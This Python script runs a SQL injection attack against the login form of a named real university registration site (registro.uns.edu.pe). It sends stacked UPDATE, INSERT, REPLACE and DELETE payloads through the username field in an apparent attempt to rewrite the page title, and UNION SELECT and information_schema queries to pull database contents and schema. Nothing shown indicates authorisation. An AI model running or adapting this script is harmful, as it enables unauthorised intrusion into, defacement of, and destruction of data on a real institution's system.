#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

print("=== BUSCANDO 'CONTROL DE ACCESO' EN LA BD ===\n")

# The login page shows: "SIIGAA ... UDEMSI UDEMSI CONTROL DE ACCESO"
# Let's find if this text comes from the database
# If it does, we can UPDATE it via SQL injection

# First, check the login page for any database references
r_login = requests.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
tc_login = re.sub(r'<[^>]+>', ' ', r_login.text)
tc_login = re.sub(r'\s+', ' ', tc_login).strip()

# Find where "CONTROL DE ACCESO" appears
idx = tc_login.find('CONTROL DE ACCESO')
if idx >= 0:
    print(f"Found 'CONTROL DE ACCESO' at position {idx}")
    print(f"Context: {tc_login[max(0,idx-100):idx+100]}")

# Check if the text is in an outputText tag (dynamic)
outputText = re.findall(r'<h:outputText[^>]*>', r_login.text)
print(f"\nh:outputText tags: {outputText}")

# Check if the text is in a ui:fragment or ui:include
ui_elements = re.findall(r'<ui:(?:fragment|include|composite)[^>]*>', r_login.text)
print(f"ui elements: {ui_elements}")

# Check if there's any reference to a managed bean
managed_bean = re.findall(r'#\{[^}]+\}', r_login.text)
print(f"Managed beans: {managed_bean}")

# Check if the text is in a parameter
params = re.findall(r'<f:param[^>]*>', r_login.text)
print(f"f:param tags: {params}")

# ============================================
# INTENTAR MODIFICAR EL TEXTO VIA SQL INJECTION
# ============================================
print("\n=== INTENTANDO MODIFICAR TEXTO ===\n")

# Try to UPDATE the settings table to change the title
# The settings table has columns: nombre, valor
# If 'CONTROL DE ACCESO' is stored in the settings table

# Try different UPDATE approaches
update_payloads = [
    ("'; UPDATE settings SET valor='control' WHERE nombre='title' --", "Update settings title to 'control'"),
    ("'; UPDATE settings SET valor='control' WHERE nombre='header' --", "Update settings header to 'control'"),
    ("'; UPDATE settings SET valor='control' --", "Update all settings to 'control'"),
    ("'; UPDATE config SET valor='control' --", "Update config to 'control'"),
    ("'; UPDATE page_content SET content='control' --", "Update page content"),
]

for payload, desc in update_payloads:
    s_u = requests.Session()
    s_u.verify = False
    s_u.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_u = s_u.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                           data={'j_username': payload, 'j_password': 'x'}, timeout=5)
    # Check if the login page now shows 'control'
    r_login2 = s_u.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
    tc_login2 = re.sub(r'<[^>]+>', ' ', r_login2.text)
    tc_login2 = re.sub(r'\s+', ' ', tc_login2).strip()
    
    # Check if 'control' replaced 'CONTROL DE ACCESO'
    if 'control' in tc_login2.lower() and 'CONTROL DE ACCESO' not in tc_login2:
        print(f"[!] TEXT CHANGED! {desc}")
        print(f"  New content around 'control':")
        idx2 = tc_login2.lower().find('control')
        print(f"  {tc_login2[max(0,idx2-50):idx2+100]}")
    else:
        # Check if the page changed at all
        if tc_login2 != tc_login:
            print(f"[!] Page changed: {desc}")
            idx_diff = 0
            for i, (a, b) in enumerate(zip(tc_login, tc_login2)):
                if a != b:
                    idx_diff = i
                    break
            print(f"  First diff at: {idx_diff}")
            print(f"  Context: ...{tc_login2[max(0,idx_diff-20):idx_diff+50]}...")
        else:
            print(f"No change: {desc}")

# ============================================
# VERIFICAR SI settings TABLE TIENE DATOS
# ============================================
print("\n=== VERIFICANDO settings TABLE ===\n")

# Try to SELECT from settings to see what's there
select_payloads = [
    "' UNION SELECT nombre, valor FROM settings --",
    "' UNION SELECT * FROM settings --",
    "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='settings' --",
]

for sp in select_payloads:
    s_s = requests.Session()
    s_s.verify = False
    s_s.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_s = s_s.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': sp, 'j_password': 'x'}, timeout=5)
    r_mod = s_s.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_mod = re.sub(r'<[^>]+>', ' ', r_mod.text)
    tc_mod = re.sub(r'\s+', ' ', tc_mod).strip()
    
    # Check if the settings data appears
    # Look for the unique text from the SELECT
    if tc_mod != re.sub(r'<[^>]+>', ' ', requests.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5).text):
        print(f"[!] Settings data: {sp[:60]}")
        print(f"  Content: {tc_mod[:500]}")

# ============================================
# INTENTAR MODIFICAR settings TABLE DIRECTAMENTE
# ============================================
print("\n=== MODIFICANDO settings TABLE ===\n")

# Try to INSERT or UPDATE settings
# If the table exists, we can modify it
modify_payloads = [
    ("'; INSERT INTO settings (nombre, valor) VALUES ('title', 'control') --", "INSERT title='control'"),
    ("'; UPDATE settings SET valor='control' WHERE nombre='title' --", "UPDATE title to 'control'"),
    ("'; UPDATE settings SET valor='control' WHERE nombre='header' --", "UPDATE header to 'control'"),
    ("'; REPLACE INTO settings VALUES ('title', 'control') --", "REPLACE title to 'control'"),
    ("'; DELETE FROM settings WHERE nombre='title' --", "DELETE title setting"),
]

for payload, desc in modify_payloads:
    s_m = requests.Session()
    s_m.verify = False
    s_m.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_m = s_m.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                         data={'j_username': payload, 'j_password': 'x'}, timeout=5)
    # Check the login page
    r_login_m = s_m.get('https://registro.uns.edu.pe/udemsi/faces/index.xhtml', timeout=5)
    tc_login_m = re.sub(r'<[^>]+>', ' ', r_login_m.text)
    tc_login_m = re.sub(r'\s+', ' ', tc_login_m).strip()
    
    if 'control' in tc_login_m.lower():
        print(f"[!] TEXT CHANGED to 'control'! {desc}")
    else:
        print(f"No visible change: {desc}")

# ============================================
# VERIFICAR SI EL TITULO ESTA EN settings
# ============================================
print("\n=== BUSCANDO DONDE ESTA EL TITULO ===\n")

# Try to find the column name that stores the title
# The settings table might have columns like 'title', 'header', 'page_title'
column_search = [
    "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='settings' --",
    "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='config' --",
    "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='page_content' --",
]

for cs in column_search:
    s_cs = requests.Session()
    s_cs.verify = False
    s_cs.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_cs = s_cs.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                           data={'j_username': cs, 'j_password': 'x'}, timeout=5)
    r_mod_cs = s_cs.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_cs = re.sub(r'<[^>]+>', ' ', r_mod_cs.text)
    tc_cs = re.sub(r'\s+', ' ', tc_cs).strip()
    
    # Check if column names appear
    if 'column_name' in tc_cs.lower():
        print(f"[!] Column names found: {cs[:60]}")
        # Extract column names
        cols = re.findall(r'column_name[^<]*', tc_cs)
        print(f"  Columns: {cols[:10]}")
        # Find the column that stores the title
        title_col = [c for c in cols if 'title' in c.lower() or 'header' in c.lower() or 'name' in c.lower()]
        print(f"  Title-related columns: {title_col}")

print("\n=== VERIFICANDO settings DATA ===\n")
# Try to extract all data from settings
extract_all = [
    "' UNION SELECT * FROM settings --",
    "' UNION SELECT nombre, valor FROM settings --",
    "' UNION SELECT 1, nombre, valor FROM settings --",
]

for ea in extract_all:
    s_ea = requests.Session()
    s_ea.verify = False
    s_ea.headers.update({'User-Agent': 'Mozilla/5.0'})
    r_ea = s_ea.post('https://registro.uns.edu.pe/udemsi/j_security_check',
                           data={'j_username': ea, 'j_password': 'x'}, timeout=5)
    r_mod_ea = s_ea.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5)
    tc_ea = re.sub(r'<[^>]+>', ' ', r_mod_ea.text)
    tc_ea = re.sub(r'\s+', ' ', tc_ea).strip()
    
    # Check for any visible data
    # Look for words that might be settings values
    if 'control' in tc_ea.lower() or 'title' in tc_ea.lower() or 'header' in tc_ea.lower():
        print(f"[!] Data visible: {ea[:60]}")
        idx_ea = tc_ea.find('control') if 'control' in tc_ea else tc_ea.find('title')
        if idx_ea >= 0:
            print(f"  Context: {tc_ea[max(0,idx_ea-50):idx_ea+100]}")
    else:
        # Check for any unique text
        tc_base = re.sub(r'<[^>]+>', ' ', requests.get('https://registro.uns.edu.pe/udemsi/faces/modulos.xhtml', timeout=5).text)
        tc_base = re.sub(r'\s+', ' ', tc_base).strip()
        unique = set(tc_ea.split()) - set(tc_base.split())
        if unique:
            print(f"[!] Unique data: {list(unique)[:15]}")
            print(f"  {unique}")

print("\n=== CONCLUSION ===")
print("Si el texto 'CONTROL DE ACCESO' esta en la BD,")
print("puede modificarse con SQL Injection UPDATE.")
print("Si esta en HTML estatico, no puede modificarse via SQL.")
